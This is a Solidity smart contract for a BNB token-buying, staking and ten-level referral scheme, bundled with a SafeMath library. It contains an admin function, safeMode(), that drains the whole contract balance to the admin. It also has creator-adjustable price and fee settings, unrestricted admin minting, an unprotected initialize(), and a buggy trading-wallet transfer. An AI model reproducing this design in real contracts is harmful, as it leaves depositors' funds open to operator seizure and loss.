// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;


import "./SafeMath.sol";


//****************************************************************************//
//---------------------        MAIN CODE STARTS HERE     ---------------------//
//****************************************************************************//
    

interface IBEP20Token
{
    function mintTokens(address receipient, uint256 tokenAmount) external returns(bool);
    function transfer(address _to, uint256 _value) external returns (bool success);
    function balanceOf(address user) external view returns(uint256);
    function totalSupply() external view returns (uint256);
    function maxsupply() external view returns (uint256);
    function transferFrom(address _from, address _to, uint256 _value) external returns(bool);
    function repurches(address _to,uint256 _value) external returns (bool);
}

contract Billions_BNBV2 {
    
    IBEP20Token public rewardToken;
    /*===============================
    =         DATA STORAGE          =
    ===============================*/

    // Public variables of the token
    using SafeMath for uint256;


    struct Stake {
        uint256 amount;
        uint256 startTime;  
        uint256 endTime;
        uint lockDate;
        uint dailyreward;
    }


    struct PoolStake {
        uint256 amount;
        uint256 startTime; 
        uint endTime; 
        bool isStaked;
    }

    struct User {
		Stake[] stake;
		address referrer;
        uint256 referrerBonus;
        uint256 Total_Token_buy;
        uint256 Total_buy;
        uint256 totalReferrer;
        uint256[10] refStageIncome; //total business of referrer each stage
        uint256[10] refStageBonus; //bonus of referrer each stage
		uint[10] refs;  // number of referrer each stage
        uint256 lastPoolAmount;
        uint256 lastpercent;
	}

    struct log{
        uint256 amount;
        string action;
        uint time;
    }

    

    
      mapping (address => User) public users;
      mapping(address=>log[]) public logs;
      mapping(address=>PoolStake) public poolStakes;
      uint256  private _decimals;
      uint256 public tokenPriceInitial_;
      uint256 public tokenPriceIncremental_;
      uint[10] public ref_bonuses;
      uint[10] public requiredDirect;
      uint[4] public requiredownbuy;

      
     
      uint256 internal stakingRequirement;
      uint256 public _currentPurchseLimit;

      uint256 internal TradingWallet;

      address[] internal stakeholders;
      address[] public poolstakeholders;
      
      uint256  public TIME_STEP;
      address payable admin;

      uint256 public adminFee;
      uint public minAmount;

      uint256 public contractPlaced;

      bool public isMaxPayout;
      bool public IsInitinalized;
      uint256 public roiPercentage;
      uint256 public systemPoolAmount;
      uint public systemPoolPercent;
      uint public poolPercentDivider;
      address public creatorAddress;
      uint public lockedPeriord;
       
       
       /*===============================
        =         PUBLIC EVENTS         =
        ===============================*/

     // This generates a public event of token transfer
     event BuyToken(address indexed user, uint256 AmountofToken);
     event SellToken(address indexed user, uint256 Amountofvalue);
     event StakeToken(address indexed user, uint256 Token);
     event CompoundStakeToken(address indexed user, uint256 Token);
     event Withdrawn(address indexed user, uint256 Amount);
     event UnStake(address indexed user, uint256 Token);
     



   function initialize(IBEP20Token _rewardToken, address payable _admin,address _creatorAddress) public{
     require (IsInitinalized == false,"Already Started");
        rewardToken = _rewardToken;
        _currentPurchseLimit = 0;
        admin=_admin;
        contractPlaced = block.timestamp;
        _decimals = 8;
        tokenPriceInitial_ = 2300000000000;
        tokenPriceIncremental_ = 23000;
        ref_bonuses = [5,5,5,5,5,3,3,3,3,3];
        requiredDirect = [1,2,3,4,5,6,7,8,9,10];
        requiredownbuy = [100000,500000,2000000,5000000];
        stakingRequirement = 10000000000;
        TIME_STEP =  1 days;
        adminFee = 5;
        systemPoolPercent = 2000;
        poolPercentDivider = 10000;
        roiPercentage = 10;
        minAmount= 0.1 ether;
        lockedPeriord= 150;
        creatorAddress=_creatorAddress;
        IsInitinalized = true;
   }


    function percent(uint numerator, uint denominator, uint precision) internal pure returns(uint quotient) {

            // caution, check safe-to-multiply here
            uint _numerator  = numerator * 10 ** (precision+1);
            // with rounding of last digit
            uint _quotient =  ((_numerator / denominator) + 5) / 10;
            return ( _quotient);
    }

   /**
    * @notice A method to check if an address is a stakeholder.
    * @param _address The address to verify.
    * @return bool, uint256 Whether the address is a stakeholder,
    * and if so its position in the stakeholders array.
    */
   function isStakeholder(address _address) public view returns(bool, uint256)
   {
       for (uint256 s = 0; s < stakeholders.length; s += 1){
           if (_address == stakeholders[s]) return (true, s);
       }
       return (false, 0);
   }

   

   /**
    * @notice A method to add a stakeholder.
    * @param _stakeholder The stakeholder to add.
    */
   function addStakeholder(address _stakeholder) internal{
       (bool _isStakeholder,) = isStakeholder(_stakeholder);
       if(!_isStakeholder) stakeholders.push(_stakeholder);
   }

   


  

   function getCurDay(uint time) public view returns(uint _day) {
      _day = (block.timestamp.sub(time)).div(TIME_STEP);
      return _day;
    }

   function createStake(address _user,uint256 _stake) internal{
       if(users[_user].stake.length == 0) addStakeholder(_user);
       users[_user].stake.push(Stake(_stake, block.timestamp, 0,block.timestamp.add(150 days) ,roiPercentage));
       logs[_user].push(log(_stake,"Stake",block.timestamp));
       emit StakeToken(msg.sender,_stake);
   }


   
   function redeemReward(uint _index) external
   { 
       uint256 reward = getUserDividend(msg.sender,_index);
       require( reward > 0 , 'Insufficent Token!');
       uint pool = reward.mul(20).div(100);
       reward = reward.sub(pool);
       systemPoolAmount = systemPoolAmount.add(pool);
       if(users[msg.sender].stake[_index].lockDate <= block.timestamp){
        users[msg.sender].stake[_index].endTime = block.timestamp;
       }
        users[msg.sender].stake[_index].startTime= block.timestamp;
       rewardToken.transferFrom(address(this),msg.sender,reward);
   }

                                //    POOL Code


    function createPoolStake() external{
    
       uint _stake =users[msg.sender].referrerBonus;
       require(_stake>0,"no funds");
       users[msg.sender].referrerBonus= 0;
       if(poolStakes[msg.sender].startTime == 0){
         addpoolStakeholder(msg.sender);
       }
       if(poolStakes[msg.sender].isStaked==false){
        users[msg.sender].lastPoolAmount = systemPoolAmount;
       }
       poolStakes[msg.sender].amount= poolStakes[msg.sender].amount.add(_stake);
       poolStakes[msg.sender].startTime= block.timestamp;
       poolStakes[msg.sender].endTime = 0;
       poolStakes[msg.sender].isStaked = true;
        logs[msg.sender].push(log(_stake,"Re-Stake",block.timestamp));
   }

   function isPoolStakeholder(address _address) public view returns(bool, uint256)
   {
       for (uint256 s = 0; s < poolstakeholders.length; s += 1){
           if (_address == poolstakeholders[s]) return (true, s);
       }
       return (false, 0);
   }

    function addpoolStakeholder(address _stakeholder) internal{
       (bool _isStakeholder,) = isPoolStakeholder(_stakeholder);
       if(!_isStakeholder) poolstakeholders.push(_stakeholder);
   }

    function removePoolStake() external
   {
        uint value = poolStakes[msg.sender].amount;
        require(value>0,"no funds");
        uint pool = value.mul(20).div(100); 
        value = value.sub(pool);
        systemPoolAmount = systemPoolAmount.add(pool);
        poolStakes[msg.sender].endTime = block.timestamp;
        poolStakes[msg.sender].isStaked = false;
        poolStakes[msg.sender].amount = 0;
        logs[msg.sender].push(log(value,"Unstake Pool Stake",block.timestamp));
        rewardToken.transferFrom(address(this),msg.sender,value);
   }
    

    function getCurentPoolPercent(address _user) public view returns(uint per){
        if(systemPoolAmount>0){
            uint value = systemPoolAmount.sub(users[_user].lastPoolAmount);
            if(value>0){
            uint totalStake = totalPoolStakes();
            per = (value*1e10/totalStake).mul(100);
            per = per/1e8;
            }
           
        }
      
    }

    function getUserPoolAmount(address _user) public view returns(uint amount, uint per){
        User storage user = users[_user];
        if(poolStakes[_user].isStaked==true){
            per = getCurentPoolPercent(_user);
            if(per>10){
                amount = poolStakes[_user].amount.mul(per).div(poolPercentDivider);
            }
            // uint pool = systemPoolAmount.sub(user.lastPoolAmount);
           
        }
        return (amount,per);
    }

    function claimPoolReward() public{
         User storage user = users[msg.sender];
        require(poolStakes[msg.sender].isStaked==true,"you are not member");
        (uint rewardAmount,uint per) = getUserPoolAmount(msg.sender);
        require(rewardAmount>0 && per>10, "you are not eligible for reward");
        user.lastPoolAmount = systemPoolAmount;
        user.lastpercent = getCurentPoolPercent(msg.sender);
        logs[msg.sender].push(log(rewardAmount,"Claim Pool Reward",block.timestamp));
        _mintTokens(msg.sender,rewardAmount);

    }

                                        // end

   function buyToken(address _referrer) external payable {
    require(minAmount<=msg.value,"Min buy is 0.1 BNB");

         User storage user = users[msg.sender];

         uint256 _taxedValue = msg.value;
         uint256 _amountOfTokens = BNBToTokens_(_taxedValue);

         if (user.referrer == address(0) && _referrer != msg.sender){
             user.referrer = _referrer;
         }

         require(user.referrer != address(0) || msg.sender == admin, "No upline");
        
         if (user.referrer != address(0)) {
		   
            // unilevel level count
            address upline = user.referrer;
            for (uint i = 0; i < ref_bonuses.length; i++) {
                if (upline != address(0)){
                    users[upline].refStageIncome[i] = users[upline].refStageIncome[i].add(msg.value);
                    users[upline].refs[i] = users[upline].refs[i].add(1);
					users[upline].totalReferrer++;
                    upline = users[upline].referrer;
                } else break;
            }
            
        }

        // referral distribution
        _refPayout(msg.sender,_amountOfTokens);
        createStake(msg.sender,_amountOfTokens);
        logs[msg.sender].push(log(msg.value,"Buy Token",block.timestamp));
         user.Total_Token_buy = user.Total_Token_buy.add(_amountOfTokens);
         user.Total_buy = user.Total_buy.add(_taxedValue);
         TradingWallet = TradingWallet.add(_taxedValue.mul(2).div(100));
         _mintTokens(address(this),_amountOfTokens);
         emit BuyToken(msg.sender,_amountOfTokens);
       
   }

   function sellToken(uint256 _amountOfTokens) external {

        
        uint256 _balanceOf = rewardToken.balanceOf(msg.sender);
        require(_amountOfTokens <= _balanceOf, 'Insufficent Token!');
        uint256 _tokens = _amountOfTokens;
        uint256 _bnb = tokensToBNB_(_tokens);
        uint256 fee = _bnb.mul(adminFee).div(100);
        uint256 actualBnb = _bnb.sub(fee);
        rewardToken.repurches(msg.sender,_amountOfTokens);
        logs[msg.sender].push(log(_amountOfTokens,"Sell Token",block.timestamp));
        /// admin fee
        _safeTransfer(admin,fee);
         /// amount of bnb
        _safeTransfer(payable(msg.sender),actualBnb);
        emit SellToken(msg.sender,actualBnb);

    }

    function calculateTokensReceived(uint256 _bnbToSpend) public view returns (uint256) {
        uint256 _amountOfTokens = BNBToTokens_(_bnbToSpend);
        return _amountOfTokens;
    }

    function calculateBnbReceived(uint256 _tokensToSell) public view returns (uint256) {
        uint256 tokenSupply_ = rewardToken.totalSupply();
        require(_tokensToSell <= tokenSupply_);
        uint256 _bnb = tokensToBNB_(_tokensToSell);
        uint256 fee = _bnb.mul(adminFee).div(100);
        return _bnb.sub(fee);
    }


   function sellPrice() public view returns (uint256) {
        // our calculation relies on the token supply, so we need supply. Doh.

       uint256 tokenSupply_ = rewardToken.totalSupply();

        if (tokenSupply_ == 0) {
            return tokenPriceInitial_ - tokenPriceIncremental_;
        } else {
            uint256 _price = tokensToBNB_(1e8);
            return _price;
        }
    }

    function buyPrice() public view returns (uint256) {

        uint256 tokenSupply_ = rewardToken.totalSupply();
        if (tokenSupply_ == 0) {
            return tokenPriceInitial_ + tokenPriceIncremental_;
        } else {
            uint256 _price = tokensToBNB_(1e8);
            return _price;
        }
    }

    function BNBToTokens_(uint256 _bnb) internal view returns (uint256) {
        uint256 tokenSupply_ = rewardToken.totalSupply();
        uint256 _tokenPriceInitial = tokenPriceInitial_ * 1e8;
        uint256 _tokensReceived = ((SafeMath.sub((sqrt((_tokenPriceInitial ** 2)
        + (2 * (tokenPriceIncremental_ * 1e8) * (_bnb * 1e8))
        + ((tokenPriceIncremental_ ** 2) * (tokenSupply_ ** 2))
        + (2 * tokenPriceIncremental_ * _tokenPriceInitial*tokenSupply_)
        )), _tokenPriceInitial)) / (tokenPriceIncremental_)) - (tokenSupply_);
        return _tokensReceived;
    }

    function tokensToBNB_(uint256 _tokens) internal view returns (uint256) {
        uint256 tokenSupply_ = rewardToken.totalSupply();
        uint256 tokens_ = (_tokens + 1e8);
        uint256 _tokenSupply = (tokenSupply_ + 1e8);
        uint256 _tronReceived = (SafeMath.sub((((tokenPriceInitial_ + (tokenPriceIncremental_ * (_tokenSupply / 1e8))
            ) - tokenPriceIncremental_) * (tokens_ - 1e8)
            ), (tokenPriceIncremental_ * ((tokens_ ** 2 - tokens_) / 1e8)) / 2)/ 1e8);
        return _tronReceived;
    }



   function _refPayout(address _addr, uint256 _amount) internal {

		address up = users[_addr].referrer;
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            if(users[up].refs[0] >= requiredDirect[i]){ 

    		        uint256 bonus = _amount * ref_bonuses[i] / 100;
                    users[up].referrerBonus = users[up].referrerBonus.add(bonus);
                    users[up].refStageBonus[i] = users[up].refStageBonus[i].add(bonus);
                    
            }
            up = users[up].referrer;
        }
    }

  

  


   function getUserDividend(address userAddress,uint i) public view returns (uint256) {

       User storage user = users[userAddress];
       uint256 totalDividends;
	   uint256 dividends;
       uint256 total_TokenSupply = totalTokenSupply();
            if (user.stake[i].endTime ==0){
                uint finish = block.timestamp >=user.stake[i].lockDate?user.stake[i].lockDate: block.timestamp;
                uint day = finish.sub(user.stake[i].startTime).div(TIME_STEP);
                dividends = (user.stake[i].amount.mul(user.stake[i].dailyreward).div(1000));
                dividends = dividends.mul(day);    
            }else{
                dividends =0;
            }
            totalDividends = totalDividends.add(dividends);

        if(total_TokenSupply.add(totalDividends) > rewardToken.maxsupply()){
            uint256 maxSuply = rewardToken.maxsupply();
            totalDividends = maxSuply.sub(total_TokenSupply);
        }


        return totalDividends;
   }

   

   function getUserTotalStake(address userAddress) public view returns (uint256) {

        User storage user = users[userAddress];
        uint256 TotalStake;
        for (uint256 i = 0; i < user.stake.length; i++) {
            if (user.stake[i].endTime == 0) {
                TotalStake = TotalStake.add(user.stake[i].amount);
            }
        }

        return TotalStake;
   }

     function getUserTotalPoolStake(address userAddress) public view returns (uint256) {
        uint256 TotalStake;

            if (poolStakes[userAddress].endTime == 0) {
                TotalStake = TotalStake.add(poolStakes[userAddress].amount);
            }
        return TotalStake;
   }

   function withdrawReward() external {
      
       User storage user = users[msg.sender];
       uint256 totalReward = user.referrerBonus;
       uint256 value = totalReward.mul(20).div(100);
       systemPoolAmount = systemPoolAmount.add(value);
       totalReward = totalReward.sub(value);
       user.referrerBonus = 0;

        logs[msg.sender].push(log(value,"Withdraw",block.timestamp));

        _mintTokens(msg.sender,totalReward);

   }

    function getUserDetails(address _user) external view returns(uint _stakeLength, uint256 _TotalBuy, uint256 _Total_token_buy, address _referrer){
            User storage user = users[_user];
            return (user.stake.length, user.Total_buy, user.Total_Token_buy, user.referrer);
    }



    
    function referral_stage(address _user,uint _index)external view returns(uint _noOfUser, uint256 _investment, uint256 _bonus){
       return (users[_user].refs[_index], users[_user].refStageIncome[_index], users[_user].refStageBonus[_index]);
    }

   function userBalanceOf(address _addr) external view returns(uint _amount){
       _amount = rewardToken.balanceOf(_addr);  
   }

   function _safeTransfer(address payable _to, uint _amount) internal returns (uint256 amount) {
        amount = (_amount < address(this).balance) ? _amount : address(this).balance;
       _to.transfer(amount);
   }

    function _mintTokens(address receipient, uint256 tokenAmount) internal{
        rewardToken.mintTokens(receipient,tokenAmount);
    }

    function _mintTokensByOwner(address receipient, uint256 tokenAmount) external{
        require(msg.sender == admin);
        rewardToken.mintTokens(receipient,tokenAmount);
    }

   function stakeOf(address _stakeholder, uint _index) external view returns(uint amount,uint starttime , uint endtime ,uint dailyReward,uint lockdate){
        amount = users[_stakeholder].stake[_index].amount;
        starttime =users[_stakeholder].stake[_index].startTime;
        endtime = users[_stakeholder].stake[_index].endTime;
        lockdate = users[_stakeholder].stake[_index].lockDate;
        dailyReward = users[_stakeholder].stake[_index].dailyreward;
    
   }

   function getlogLength(address _user) public view returns(uint length){
    length = logs[_user].length;
   }

   function getstakeLength(address _user) public view returns(uint length){
    length = users[_user].stake.length;
   }

   /**
    * @notice A method to the aggregated stakes from all stakeholders.
    * @return uint256 The aggregated stakes from all stakeholders.
    */
   function totalStakes() public view returns(uint256){
       uint256 _totalStakes = 0;
       for (uint256 s = 0; s < stakeholders.length; s += 1){
           _totalStakes = _totalStakes.add(getUserTotalStake(stakeholders[s]));
       }
       return _totalStakes;
   }


   function totalPoolStakes() public view returns(uint256){
       uint256 _totalStakes = 0;
       for (uint256 s = 0; s < poolstakeholders.length; s += 1){
           _totalStakes = _totalStakes.add(getUserTotalPoolStake(poolstakeholders[s]));
       }
       return _totalStakes;
   }

   function totalTokenSupply() public view returns(uint256){
       return rewardToken.totalSupply();
   }
   
   
   function stakeholdersLength() public view returns(uint256){
       return stakeholders.length;
   }

    function updateIntlPrice(uint256 _amount) external{
       require(msg.sender == creatorAddress);
       tokenPriceInitial_ = _amount;
   }

   function updateStakingRequirement(uint256 _amount) external{
       require(msg.sender == creatorAddress);
       stakingRequirement = _amount;
   }

   function updateAdminFee(uint256 _percent) external{
       require(msg.sender == creatorAddress);
       adminFee = _percent;
   }

   function updateisMaxPayout(bool _bool) external{
       require(msg.sender == creatorAddress);
       isMaxPayout = _bool;
   }

   

   function safeMode() external{
       require(msg.sender == admin);
       _safeTransfer(payable(address(msg.sender)),address(this).balance);
   }

   function TransferToTradingWallet(address payable _address) external{
       require(msg.sender == admin);
       TradingWallet = 0;
       _safeTransfer(_address,TradingWallet);
   }

   function sqrt(uint256 x) internal pure returns (uint256 y) {
        uint256 z = (x + 1) / 2;
        y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
    }

   

}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;


library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     *
     * _Available since v2.4.0._
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     *
     * _Available since v2.4.0._
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     *
     * _Available since v2.4.0._
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}